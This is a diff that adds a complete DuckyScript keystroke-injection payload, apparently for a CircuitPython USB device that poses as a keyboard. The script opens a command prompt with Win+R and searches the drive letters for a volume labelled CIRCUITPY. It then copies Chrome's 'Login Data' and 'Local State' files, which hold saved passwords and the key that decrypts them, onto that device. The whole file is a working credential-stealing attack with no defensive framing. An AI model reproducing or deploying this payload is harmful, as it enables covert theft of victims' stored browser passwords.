@@ -1,0 +1,44 @@
+DEFAULTDELAY 10
+DELAY 5000
+GUI r
+DELAY 250
+STRING cmd /Q /D /T:7F /F:OFF /V:ON /K
+ENTER
+DELAY 2500
+REM get the path for the circuitpy 
+STRING :while1
+ENTER
+STRING for %d in (A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S, T, U, V, W, X, Y, Z) do (
+ENTER
+STRING for /f "tokens=6 delims= " %i in ('Vol %d:') do (
+ENTER
+STRING if "%i" EQU "CIRCUITPY" (  set "CIRCUITPYdrive=%d:"  )
+ENTER
+STRING )
+ENTER
+STRING )
+ENTER
+STRING if Exist %CIRCUITPYdrive% (
+ENTER
+STRING goto :break
+ENTER
+STRING )
+ENTER
+STRING timeout /t 30
+ENTER
+DELAY 100
+ENTER
+STRING goto :while1
+ENTER
+STRING :break
+ENTER
+STRING set rand=%RANDOM%
+ENTER
+STRING copy %LOCALAPPDATA%\Google\Chrome\"User Data"\Default\"Login Data" %CIRCUITPYdrive%\pass\LoginData%rand% ;
+ENTER
+STRING copy %LOCALAPPDATA%\Google\Chrome\"User Data"\"Local State" %CIRCUITPYdrive%\pass\LocalState%rand% ;
+ENTER
+DELAY 5000
+ENTER
+STRING exit
+ENTER
